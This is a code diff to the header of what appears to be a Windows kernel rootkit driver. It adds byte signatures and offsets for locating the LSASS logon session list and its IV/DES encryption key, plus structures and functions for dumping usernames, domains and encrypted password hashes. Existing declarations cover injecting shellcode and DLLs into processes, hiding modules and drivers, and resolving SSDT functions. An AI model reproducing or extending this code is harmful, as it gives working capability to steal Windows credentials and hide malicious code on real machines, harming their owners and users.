@@ -24,6 +24,22 @@ constexpr SIZE_T THREAD_KERNEL_STACK_OFFSET = 0x58;
 constexpr SIZE_T THREAD_CONTEXT_STACK_POINTER_OFFSET = 0x2C8;
 constexpr UCHAR LogonSessionListLocation[] = {0xC1, 0xE1, 0x03, 0xE8, 0xCC, 0xCC, 0xCC , 0xFF};
 constexpr UCHAR IvDesKeyLocation[] = { 0x21, 0x45, 0xD4, 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0x00, 0x21, 0x45, 0xD8 };
+constexpr UCHAR FunctionStartSignature[] = { 0x40, 0x55 };
+constexpr UCHAR LogonSessionListCountSignature[] = { 0x48, 0x89, 0x45, 0xCC, 0x44, 0x8B, 0x05 };
+constexpr UCHAR LogonSessionListLockSignature[] = { 0xCC, 0x8D, 0x35 };
+constexpr UCHAR LogonSessionListSignature[] = { 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0x00, 0x8B };
+constexpr UCHAR IvSignature[] = { 0x44, 0x8B, 0xC6, 0x48, 0x8D, 0x15 };
+constexpr UCHAR DesKeySignature[] = { 0x44, 0x8B, 0x4D, 0xD4, 0x48, 0x8D, 0x15 };
+constexpr SIZE_T LogonSessionListCountOffset = 0xB;
+constexpr SIZE_T LogonSessionListLockOffset = 3;
+constexpr SIZE_T LogonSessionListOffset = 3;
+constexpr SIZE_T IvOffset = 6;
+constexpr SIZE_T DesKeyOffset = 7;
+constexpr SIZE_T DesKeyStructOffset = 0xB;
+constexpr SIZE_T LsaInitializeProtectedMemoryLen = 0x310;
+constexpr SIZE_T WLsaEnumerateLogonSessionLen = 0x2ad;
+constexpr SIZE_T LogonSessionListLocationDistance = 0x4e730;
+constexpr SIZE_T IvDesKeyLocationDistance = 0x43050;
 
 inline UCHAR shellcodeTemplate[DLL_INJ_SHELLCODE_SIZE] = {
 	0x56, 0x48, 0x89, 0xE6, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20,
@@ -149,19 +165,31 @@ struct PkgReadWriteData {
 	PVOID RemoteAddress;
 };
 
+struct DesKeyInformation {
+	ULONG Size;
+	PVOID Data;
+};
+
 struct Credentials {
-	WCHAR* Username;
-	PVOID* EncryptedHash;
+	UNICODE_STRING Username;
+	UNICODE_STRING Domain;
+	UNICODE_STRING EncryptedHash;
+};
+
+struct OutputCredentials {
+	ULONG Index;
+	Credentials Creds;
 };
 
 struct LsassInformation {
-	PVOID IV;
-	PVOID DesKey;
+	FastMutex Lock;
+	DesKeyInformation DesKey;
 	ULONG Count;
+	ULONG LastCredsIndex;
 	Credentials* Creds;
 };
 
-// Prototypes.
+// General functions.
 VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);
 VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);
 
@@ -171,6 +199,7 @@ private:
 	HiddenDriversList hiddenDrivers;
 	PSYSTEM_SERVICE_DESCRIPTOR_TABLE ssdt;
 	tNtCreateThreadEx NtCreateThreadEx;
+	LsassInformation lastLsassInfo;
 
 	bool AddHiddenDriver(HiddenDriverItem item);
 	ULONG FindHiddenDriver(HiddenDriverItem item);
@@ -183,6 +212,7 @@ private:
 	NTSTATUS FindAlertableThread(HANDLE pid, PETHREAD* Thread);
 	NTSTATUS GetSSDTAddress();
 	PVOID GetSSDTFunctionAddress(CHAR* functionName);
+	void SetCredLastIndex();
 
 public:
 	void* operator new(size_t size) {
@@ -204,11 +234,13 @@ public:
 	NTSTATUS InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo);
 	NTSTATUS InjectDllThread(DllInformation* DllInfo);
 	NTSTATUS InjectDllAPC(DllInformation* DllInfo);
-	PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset);
+	PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset, bool reversed = false);
 	NTSTATUS HideModule(HiddenModuleInformation* ModuleInformation);
 	NTSTATUS HideDriver(HiddenDriverInformation* DriverInformation);
 	NTSTATUS UnhideDriver(HiddenDriverInformation* DriverInformation);
-	NTSTATUS DumpCredentials(LsassInformation* LsassInformation);
+	NTSTATUS DumpCredentials(ULONG* AllocationSize);
+	NTSTATUS GetDesKey(DesKeyInformation* DesKey);
+	NTSTATUS GetCredentials(OutputCredentials* Credential);
 
 	bool FoundNtCreateThreadEx() { return NtCreateThreadEx != NULL; }
 	ULONG GetHiddenDrivers() { return this->hiddenDrivers.Count; }
